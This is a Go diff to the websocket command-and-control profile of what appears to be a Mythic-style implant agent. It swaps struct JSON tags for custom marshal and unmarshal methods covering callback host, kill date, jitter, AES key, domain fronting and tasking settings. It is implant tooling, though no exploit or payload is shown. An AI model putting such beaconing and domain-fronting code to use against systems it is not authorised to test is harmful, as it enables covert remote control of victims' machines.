@@ -32,43 +32,100 @@ import (
 var websocket_initial_config string
 
 type WebsocketInitialConfig struct {
-	CallbackHost           string `json:"callback_host"`
-	CallbackPort           uint   `json:"callback_port"`
-	Killdate               string `json:"killdate"`
-	Interval               uint   `json:"callback_interval"`
-	Jitter                 uint   `json:"callback_jitter"`
-	EncryptedExchangeCheck bool   `json:"encrypted_exchange_check"`
-	AESPSK                 string `json:"AESPSK"`
-	Endpoint               string `json:"ENDPOINT_REPLACE"`
-	DomainFront            string `json:"domain_front"`
-	TaskingType            string `json:"tasking_type"`
-	UserAgent              string `json:"USER_AGENT"`
+	CallbackHost           string
+	CallbackPort           uint
+	Killdate               string
+	Interval               uint
+	Jitter                 uint
+	EncryptedExchangeCheck bool
+	AESPSK                 string
+	Endpoint               string
+	DomainFront            string
+	TaskingType            string
+	UserAgent              string
+}
+
+func (e *WebsocketInitialConfig) UnmarshalJSON(data []byte) error {
+	alias := map[string]interface{}{}
+	err := json.Unmarshal(data, &alias)
+	if err != nil {
+		return err
+	}
+	if v, ok := alias["callback_host"]; ok {
+		e.CallbackHost = v.(string)
+	}
+	if v, ok := alias["callback_port"]; ok {
+		e.CallbackPort = uint(v.(float64))
+	}
+	if v, ok := alias["killdate"]; ok {
+		e.Killdate = v.(string)
+	}
+	if v, ok := alias["callback_interval"]; ok {
+		e.Interval = uint(v.(float64))
+	}
+	if v, ok := alias["callback_jitter"]; ok {
+		e.Jitter = uint(v.(float64))
+	}
+	if v, ok := alias["encrypted_exchange_check"]; ok {
+		e.EncryptedExchangeCheck = v.(bool)
+	}
+	if v, ok := alias["AESPSK"]; ok {
+		e.AESPSK = v.(string)
+	}
+	if v, ok := alias["ENDPOINT_REPLACE"]; ok {
+		e.Endpoint = v.(string)
+	}
+	if v, ok := alias["domain_front"]; ok {
+		e.DomainFront = v.(string)
+	}
+	if v, ok := alias["tasking_type"]; ok {
+		e.TaskingType = v.(string)
+	}
+	if v, ok := alias["USER_AGENT"]; ok {
+		e.UserAgent = v.(string)
+	}
+	return nil
 }
 
 const TaskingTypePush = "Push"
 const TaskingTypePoll = "Poll"
 
 type C2Websockets struct {
-	HostHeader            string `json:"HostHeader"`
-	BaseURL               string `json:"BaseURL"`
-	Interval              int    `json:"Interval"`
-	Jitter                int    `json:"Jitter"`
-	ExchangingKeys        bool   `json:"-"`
-	UserAgent             string `json:"UserAgent"`
-	Key                   string `json:"EncryptionKey"`
+	HostHeader            string
+	BaseURL               string
+	Interval              int
+	Jitter                int
+	ExchangingKeys        bool
+	UserAgent             string
+	Key                   string
 	RsaPrivateKey         *rsa.PrivateKey
-	PollConn              *websocket.Conn `json:"-"`
-	PushConn              *websocket.Conn `json:"-"`
-	Lock                  sync.RWMutex    `json:"-"`
-	ReconnectLock         sync.RWMutex    `json:"-"`
-	Endpoint              string          `json:"Websocket URL Endpoint"`
-	TaskingType           string          `json:"TaskingType"`
-	Killdate              time.Time       `json:"KillDate"`
+	PollConn              *websocket.Conn
+	PushConn              *websocket.Conn
+	Lock                  sync.RWMutex
+	ReconnectLock         sync.RWMutex
+	Endpoint              string
+	TaskingType           string
+	Killdate              time.Time
 	FinishedStaging       bool
 	ShouldStop            bool
 	stoppedChannel        chan bool
-	PushChannel           chan structs.MythicMessage `json:"-"`
+	PushChannel           chan structs.MythicMessage
 	interruptSleepChannel chan bool
+}
+
+func (e C2Websockets) MarshalJSON() ([]byte, error) {
+	alias := map[string]interface{}{
+		"HostHeader":             e.HostHeader,
+		"BaseURL":                e.BaseURL,
+		"Interval":               e.Interval,
+		"Jitter":                 e.Jitter,
+		"UserAgent":              e.UserAgent,
+		"EncryptionKey":          e.Key,
+		"Websocket URL Endpoint": e.Endpoint,
+		"TaskingType":            e.TaskingType,
+		"KillDate":               e.Killdate,
+	}
+	return json.Marshal(alias)
 }
 
 var websocketDialer = websocket.Dialer{
@@ -162,7 +219,7 @@ func (c *C2Websockets) Sleep() {
 	// wait for either sleep time duration or sleep interrupt
 	select {
 	case <-c.interruptSleepChannel:
-	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
+	case <-time.After(time.Second * time.Duration(GetSleepTime())):
 	}
 }
 func (c *C2Websockets) CheckForKillDate() {
